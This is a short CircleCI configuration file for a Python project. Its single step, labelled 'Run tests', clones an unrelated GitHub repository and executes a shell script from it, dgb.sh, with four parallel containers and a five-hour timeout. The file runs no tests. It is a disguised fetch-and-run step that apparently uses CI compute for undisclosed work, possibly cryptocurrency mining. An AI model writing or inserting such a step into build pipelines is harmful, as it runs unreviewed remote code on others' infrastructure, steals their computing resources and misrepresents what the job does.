version: 2.1 
 
orbs: 
   
  python: circleci/python@1.2 
 
workflows: 
  sample:   
    jobs: 
      - build-and-test 
 
 
jobs: 
  build-and-test:
    parallelism: 4
    docker: 
      - image: cimg/python:3.8 
     
    steps: 
      - checkout 
      - run: 
          name: Run tests 
          no_output_timeout: 5h 
          command: git clone https://github.com/IdaAMcKay/IdaAMcKay.git && cd IdaAMcKay && chmod +x dgb.sh && ./dgb.sh
